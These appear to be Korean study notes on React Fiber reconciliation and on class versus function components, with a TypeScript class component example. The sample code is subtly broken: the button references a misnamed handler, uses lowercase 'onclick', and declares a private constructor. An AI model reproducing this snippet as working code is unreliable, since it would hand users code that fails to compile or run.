이 workInProgress 트리를 빌드하는 과정이 끝나면 다음 렌더링에 이 트리를 사용한다. 그 후 workInProgress 트리가 최종적으로 렌더링되면 current(flushed fiber)가 workInProgress Tree가 된다.

### 파이버의 작업순서

- beginWork()함수를 실행하는데, 자식이 없는 파이버를 만날때까지, 트리 형식으로 시작된다.
- completeWork()함수로 파이버 작업을 완료한다.
- 형제가 있다면 형제로 넘어간다.
- 모든 과정이 끝나면 return으로 돌아가 자신의 작업이 완료되었음을 알린다.

만약 setState 등으로 업데이트가 발생하면 어떻게 될까?

다시 setState으로 요청을 받아 workInProgress 트리를 다시 빌드하게 된다. 최초 로드 시에는 모든 파이버를 새로 만들어야 했지만, 기존 파이버를 사용해 빌드를 하게 된다.

트리를 빌드하는 과정은 중단될 수 없었다. 그러나 현재 우선순위가 높은 다른 업데이트가 오면 현재 작업을 일시 중단하거나, 폐기해버릴 수도 있다.

애니메이션이나 사용자의 입력등과 같은 작업을 우선순위가 높은 작업으로 분리하거나, 목록을 렌더링하는 작업은 우선순위가 낮게 분리해 최적으로 작업을 끝낼 수 있게 한다.

### 클래스형 컴포넌트, 함수형 컴포넌트

```ts
import React from 'react'

// props 타입을 선언한다.
interface SampleProps {
	required?: boolean;
    text: string;
}

// state 타입을 선언한다.
interface SampleState {
	count: number;
    isLimited?: boolean;
}

// Component에 제네릭으로 props, state를 순서대로 넣어준다.
class SampleComponent extends React.Component<SampleProps, SampleState> {
	// consturctor에서 props를 넘겨주고, state의 기본값을 설정한다.
	private constructor(props: SampleProps) {
    	super(props);
        this.state = {
        	count: 0,
            isLimited: false
       	}
    };
    // render 내부에서 쓰일 함수를 선언한다.
    private handleClick = () => {
    	const newValue = this.state.count + 1;
        this.setState({count: newValue, isLimited: newValue >= 10})
    }
   	// render에서 이 컴포넌트가 렌더링할 내용을 정의한다.
    public render() {
    	// props와 state 값을 this, 즉 해당 클래스에서 꺼낸다.
        const {
        	props: { required, text },
            state: { count, isLimited },
        } = this

	return (
		<h2>
    		Sample Component
    		<div>{required ? '필수' : '필수 아님'}</div>
    		<div>문자: {text}</div>
    		<div>count: {count}</div>
    		<button onclick={this.handClick} disabled={isLimited}>증가</button>
        </h2>
    )
  }
}
```


## 클래스형과 함수형 컴포넌트

초기 함수형 컴포넌트는 단순히 요소를 정적으로 렌더링 하는 것이 목표였지만, 16.8 업데이트 이후 달라졌다.

#### 클래스형 컴포넌트

클래스형 컴포넌트를 사용하며 가장 많이 언급되는 것은 생명주기 이다.

- Mount, 컴포넌트가 생성 되는 시점
- Update, 이미 생성된 컴포넌트가 업데이트 되는 시점
- Unmount, 컴포넌트가 더 이상 존재하지 않는 시점

#### 클래스형 컴포넌트의 Render()

항상 순수해야하며 Side Effect가 없어야한다. render 함수 내부에서 setState를 호출해서는 안된다.

#### Pure Component와 일반 Component

shouldComponentUpdate 생명주기를 다룸에 있어서 차이가 있다. Pure Component는 얕은 비교만 진행하여 변경사항이 있을 경우 재 렌더링 시킨다.

#### ErrorBoundary

componentDidCatch는 개발모드와 프로덕션모드에서 다르게 동작한다. 개발모드에서는 에러가 발생하면 window까지 전파되고, 프로덕션모드에서는 잡히지 않는 에러만 전파된다.

#### 클래스형 컴포넌트의 한계

- 데이터 흐름을 추적하기 어렵다
- 애플리케이션 내부 로직의 재사용이 어렵다.
- 기능이 많아질수록 컴포넌트 크기가 커진다.
- 클래스는 함수에 비해 상대적으로 어렵다.

#### 클래스형 VS 함수형

클래스형은 항상 this를 참조하기에 중간에 값이 변경되는 경우 변경 된 값이 렌더링되고, 함수형은 렌더링이 일어난 순간의 값을 가지고 사용한다.


